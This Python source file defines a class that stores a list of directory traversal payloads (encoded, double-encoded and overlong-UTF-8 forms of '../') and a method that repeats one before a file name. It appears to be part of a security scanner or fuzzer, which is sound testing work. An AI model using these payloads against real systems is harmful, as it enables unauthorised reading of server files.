# simple class for directory traversal vulnerbility
class DirTrav:

	def __init__(self):
		self.xpath = []
		self.xpath.append("../")
		self.xpath.append("..\\")
		self.xpath.append("....//")
		self.xpath.append("..../")
		self.xpath.append(".../")
		self.xpath.append("....\\\\")
		self.xpath.append("...\\\\")
		self.xpath.append("./")
		self.xpath.append("%80../")
		self.xpath.append("%80..\\")
		self.xpath.append("%%32%65")
		self.xpath.append("%2%65%2%65%2%66")
		#----------LowerCase start
		self.xpath.append("%5c../")
		self.xpath.append("..%5c/")
		self.xpath.append("..%5c")
		self.xpath.append("%2e%2e%2f")
		self.xpath.append("%2e%2e/")
		self.xpath.append("%2e%2e\\")
		self.xpath.append("..%2f")
		self.xpath.append("%2e%2e%5c")
		self.xpath.append("%252e%252e%255c")
		self.xpath.append("%252e%252e%252f")
		self.xpath.append("..%255c")
		self.xpath.append("..%c1%1c")
		self.xpath.append("..%c0%af")
		self.xpath.append("%%32e%%32e%%32f")
		self.xpath.append("%u002e%u002e%u002f")
		#----------LowerCase end
		#----------UpeerCase start
		self.xpath.append("%5C../")
		self.xpath.append("..%5C/")
		self.xpath.append("..%5C")
		self.xpath.append("%2E%2E%2F")
		self.xpath.append("%2E%2E/")
		self.xpath.append("%2E%2E\\")
		self.xpath.append("..%2F")
		self.xpath.append("%2E%2E%5C")
		self.xpath.append("%252E%252E%255C")
		self.xpath.append("%252E%252E%252F")
		self.xpath.append("..%255C")
		self.xpath.append("..%C1%1C")
		self.xpath.append("..%C0%AF")
		self.xpath.append("%%32E%%32E%%32F")
		self.xpath.append("%U002E%U002E%U002F")
		#----------UpperCase end

	def make_path(self, path, file_name, count):
		a = ""
		for i in xrange(0, count):
			a = a + path
		return a + file_name

